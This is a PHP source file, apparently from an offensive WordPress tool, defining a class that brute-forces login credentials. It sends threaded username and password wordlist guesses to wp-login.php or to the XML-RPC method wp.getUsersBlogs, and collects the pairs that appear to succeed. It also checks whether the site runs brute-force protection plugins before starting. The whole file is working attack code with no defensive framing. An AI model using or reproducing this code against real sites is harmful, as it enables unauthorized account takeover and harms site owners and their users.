<?php

class WPBrute {

    var $url, $method;

    function __construct($url, $method) {
        $this->method = $method;
        $this->url = $url;
    }

    function brute() {
        if( Config::get('protected') ) {
            msg("[+] Checking if the site is bruteproof");
            if( $protector = $this->isProtected() ) {
                foreach ($protector as $plugin) {
                    msg("[-] The site is protected by ".$plugin." plugin");
                }
                return false;
            }
        }
        $usernames = $this->getList('bfuser');
        if(!$usernames) return false;
        $passwords = $this->getList('bfwordlist');
        if(!$passwords) return false;
        print "[!] how many threads to use? [default = 10] ";
        $answer = trim(fgets(STDIN));
        $threads = ctype_digit($answer) ? $answer : 10;
        $chunks = array_chunk($passwords, $threads);
        foreach ($usernames as $username) {
            foreach ($chunks as $passwordsChunk) {
                foreach ($passwordsChunk as $i => $password) {
                    $urls[] = $this->url.'/'.$this->method.'.php';
                    if($this->method == 'wp-login') {
                        $datas[] = ['log='.urlencode($username).'&pwd='.urlencode($password).'&wp-submit=Log+In&testcookie=1', ['Content-type: application/x-www-form-urlencoded','Cookie: wordpress_test_cookie=WP+Cookie+check']];
                    } else {
                        $post = '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.$username.'</value></param><param><value>'.$password.'</value></param></params></methodCall>';
                        $datas[] = [$post, ['Content-type: text/xml', 'Content-length: '.strlen($post)]];
                    }
                }
                $responses = HTTPMultiRequest($urls, 1, $datas);
                foreach ($responses as $key => $resp) {
                    preg_match('#HTTP/\d+\.\d+ (\d)#', $resp, $match);
                    if($match[1] != 4 || $match[1] != 5) {
                        if($this->method == 'wp-login') {
                            if(stripos($resp, 'httponly') !== false) {
                                $creds[] = [$username, $passwordsChunk[$key]];
                            }
                        } else {
                            if(stripos($resp, '<int>403</int>') === false) {
                                $creds[] = [$username, $passwordsChunk[$key]];
                            }
                        }
                    }
                }
                unset($datas);
                unset($urls);
            }
        }
        if( !empty($creds) ) {
            return $creds;
        } else {
            msg("[-] Login credentials not found");
            return false;
        }
    }

    function getList($type) {
        $str = ucfirst(str_replace(['bf', 'list'], '', $type));
        if( Config::get($type) ) {
            if( !file_exists( Config::get($type) ) ) {
                if( $type == 'bfuser' ) {
                    $array[] = Config::get($type);
                } else {
                    msg("[-] ".$str."list file does not exist");
                    return false;
                }
            } else {
                $array = file(Config::get($type), FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            }
        }
        if(!empty($array)) {
            msg("[+] ".count($array)." ".$str."list loaded");
            return $array;
        } else {
            msg("[-] ".$str."list is not defined");
            return false;
        }
    }

    function isProtected() {
        $plugins = [

                       'better-wp-security',
                       'simple-login-lockdown',
                       'login-security-solution',
                       'limit-login-attempts',
                       'bluetrait-event-viewer',

                   ];
        foreach ($plugins as $plugin) {
            $urls[] = $this->url.'/wp-content/plugins/'.$plugin.'/';
        }
        $response = HTTPRequest($this->url.'/wp-login.php');
        $responses = HTTPMultiRequest($urls, false);
        if(strpos($response, 'Login LockDown') !== false) {
            $pros[] = 'login-lockdown';
        }
        if(strpos($response, 'LOGIN LOCK') !== false) {
            $pros[] = 'login-lock';
        }
        foreach ($responses as $key => $resp) {
            if(stripos($resp, '200 ok') !== false || stripos($resp, '403 forbidden') !== false) {
                $pros[] = $plugins[$key];
            }
        }
        return !empty($pros) ? $pros : false;
    }

}